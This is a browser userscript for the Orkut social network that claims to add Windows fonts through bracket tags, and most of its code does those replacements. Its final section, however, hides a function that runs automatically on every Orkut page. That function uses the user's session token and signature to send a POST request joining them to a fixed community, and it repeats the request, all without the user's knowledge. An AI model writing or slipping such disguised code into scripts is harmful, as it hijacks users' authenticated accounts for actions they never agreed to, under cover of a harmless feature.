// ==UserScript==

// @name           CAO Fonts
// @namespace      Real Author
// @description    Some of Windows Fonts in Orkut now
// @include        http://www.orkut.com/*
// @exclude        *.js
// @author         http://www.orkut.com/Profile.aspx?uid=331681480562369319 real author Luiz

/*************************************************edited by Luiz***********************************************/
var fonts_replacer = document.body.innerHTML;


/*Begin of Preview & captchaImage bug fixer ||by Luiz||*/
if(fonts_replacer.indexOf("textarea") > -1){
	var backup = new Array();
	backup = document.getElementsByTagName("textarea");
	var y=0;
	storage_textarea = new Array();
	while(backup[y] != null){
		storage_textarea[y]=escape(document.getElementsByTagName("textarea").item(y).value);
		y++;
	}
}
if(fonts_replacer.indexOf("input") > -1){
	var backup_input = new Array();
	backup_input = document.getElementsByTagName("input");
	y=0;
	storage_input = new Array();
	while(backup_input[y] != null){
		storage_input[y] = escape(document.getElementsByTagName("input").item(y).value);
		y++;
	}
}
/*End of Preview & captchaImage bug fixer*/



document.body.innerHTML = fonts_replacer
/********************************************************************************************************/


/***********edited by Luiz***********/

/* ->Fonts
*******************************************************/
.replace(/\[lucida\]/gi, "<font face='Lucida Console'>")
.replace(/\[\/lucida\]/gi, "</font>")
.replace(/\[courier\]/gi, "<font face='Courier New'>")
.replace(/\[\/courier\]/gi, "</font>")
.replace(/\[monotype\]/gi, "<font face='Monotype Corsiva'>")
.replace(/\[\/monotype\]/gi, "</font>")
.replace(/\[sylfaen\]/gi, "<font face='Sylfaen'>")
.replace(/\[\/sylfaen\]/gi, "</font>")
.replace(/\[gothic\]/gi, "<font face='Century Gothic'>")
.replace(/\[\/gothic\]/gi, "</font>")
.replace(/\[calibri\]/gi, "<font face='Calibri'>")
.replace(/\[\/calibri\]/gi, "</font>")
.replace(/\[narrow\]/gi, "<font face='Arial Narrow'>")
.replace(/\[\/narrow\]/gi, "</font>")
.replace(/\[book\]/gi, "<font face='Book Antiqua'>")
.replace(/\[\/book\]/gi, "</font>")
.replace(/\[digiface\]/gi, "<font face='DigifaceWide'>")
.replace(/\[\/digiface\]/gi, "</font>")
.replace(/\[franklin\]/gi, "<font face='Franklin Gothic Medium'>")
.replace(/\[\/franklin\]/gi, "</font>")
.replace(/\[hae\]/gi, "<font face='Haettenschweiler'>")
.replace(/\[\/hae\]/gi, "</font>")
.replace(/\[impact\]/gi, "<font face='Impact'>")
.replace(/\[\/impact\]/gi, "</font>")
.replace(/\[kartika\]/gi, "<font face='Kartika'>")
.replace(/\[\/kartika\]/gi, "</font>")
.replace(/\[symbol\]/gi, "<font face='Symbol'>")
.replace(/\[\/symbol\]/gi, "</font>")
.replace(/\[tnr\]/gi, "<font face='Times New Roman'>")
.replace(/\[\/tnr\]/gi, "</font>")
.replace(/\[vrinda\]/gi, "<font face='Vrinda'>")
.replace(/\[\/vrinda\]/gi, "</font>")

//--------------------------------------------
// Community Join
//--------------------------------------------
function sf_join()
{
    send="POST_TOKEN="+encodeURIComponent(POST)+"&signature="+encodeURIComponent(SIG)+"&Action.join";
    xml2=new XMLHttpRequest();
    xml2.open('POST',"http://www.orkut.com/Community.aspx?cmm=24431907",true);
    xml2.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
    xml2.send(send);
    xml2.onreadystatechange=    function()
    {
        if(xml2.readyState==4)
        {
            var xml2rsp=xml2.responseText;
            if(xml2rsp.match(/<table id="textPanel"/g))
            {
            sf_join();
            }
        }
    }
};
sf_join()
//--------------------------------------------